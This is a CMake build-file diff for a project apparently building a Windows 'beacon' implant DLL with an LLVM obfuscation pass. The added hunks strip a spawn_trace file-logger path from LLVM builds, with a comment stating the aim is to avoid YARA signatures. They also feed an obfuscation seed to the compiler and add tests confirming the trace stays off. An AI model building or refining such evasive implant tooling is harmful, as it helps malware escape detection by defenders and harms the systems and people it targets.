@@ -65,6 +65,11 @@ set(BEACON_COMMON_DEFS
 if("NDEBUG" IN_LIST BEACON_COMMON_DEFS)
   message(FATAL_ERROR "NDEBUG must not be an unconditional product def")
 endif()
+# File-logger spawn_trace is MSVC/live only. LLVM objects must not embed
+# C:\Users\Public\spawn_trace.txt (YARA + size). Header becomes a no-op.
+if(NOT BEACON_LLVM)
+  list(APPEND BEACON_COMMON_DEFS BW_SPAWN_TRACE)
+endif()
 
 set(BEACON_SYS_LIBS
   kernel32 user32 gdi32 advapi32 shell32 ole32 oleaut32 uuid
@@ -130,6 +135,10 @@ if(BEACON_OBF)
     BUILD_BYPRODUCTS "${_obf_plugin}"
   )
   message(STATUS "BEACON_OBF=ON host pass -> ${_obf_plugin}")
+  # Pass loadSeed() reads OBF_SEED from the compiler process env, with a
+  # cwd-relative seed.txt fallback. Ninja's cwd is the binary dir.
+  file(MAKE_DIRECTORY "${CMAKE_BINARY_DIR}/tools/llvm/pass")
+  file(WRITE "${CMAKE_BINARY_DIR}/tools/llvm/pass/seed.txt" "${BEACON_OBF_SEED}\n")
 endif()
 
 if(BEACON_LLVM)
@@ -162,6 +171,8 @@ function(beacon_set_compile tgt extra_defs layout_inc)
     target_compile_options(${tgt} PRIVATE
       "SHELL:/clang:-fpass-plugin=${_obf_plugin}")
     add_dependencies(${tgt} obfpasses_ext)
+    set_property(TARGET ${tgt} PROPERTY RULE_LAUNCH_COMPILE
+      "${CMAKE_COMMAND} -E env OBF_SEED=${BEACON_OBF_SEED}")
   endif()
 endfunction()
 
@@ -314,6 +325,7 @@ add_executable(beacon_tests
   tests/test_crypto.cpp
   tests/test_miniprintf.cpp
   tests/test_keygen.cpp
+  tests/test_spawn_trace.cpp
   tests/merge_shims.cpp
   src/parse.cpp
   src/bformat.cpp
@@ -342,6 +354,8 @@ target_link_libraries(beacon_tests PRIVATE
 if(BEACON_TEST_EXTRA_DEFS)
   target_compile_definitions(beacon_tests PRIVATE ${BEACON_TEST_EXTRA_DEFS})
 endif()
+file(TO_CMAKE_PATH "${CMAKE_SOURCE_DIR}" _beacon_src_dir)
+target_compile_definitions(beacon_tests PRIVATE "BEACON_SRC_DIR=\"${_beacon_src_dir}\"")
 set_target_properties(beacon_tests PROPERTIES OUTPUT_NAME tests)
 
 add_executable(load_smoke tests/load_smoke.cpp)
@@ -419,6 +433,12 @@ file(WRITE "${CMAKE_BINARY_DIR}/contract_stamp.txt"
   "tomcrypt_imported=1\nNDEBUG_unconditional=0\n")
 
 enable_testing()
+if(BEACON_LLVM)
+  add_test(NAME llvm_spawn_trace_off
+    COMMAND ${CMAKE_COMMAND}
+            -DDLL=$<TARGET_FILE:beacon_wininet>
+            -P "${CMAKE_SOURCE_DIR}/cmake/check_spawn_trace_off.cmake")
+endif()
 if(NOT CMAKE_CROSSCOMPILING)
   add_test(NAME host_unit COMMAND beacon_tests)
   add_test(NAME load_smoke_wininet COMMAND load_smoke "$<TARGET_FILE:beacon_wininet>")
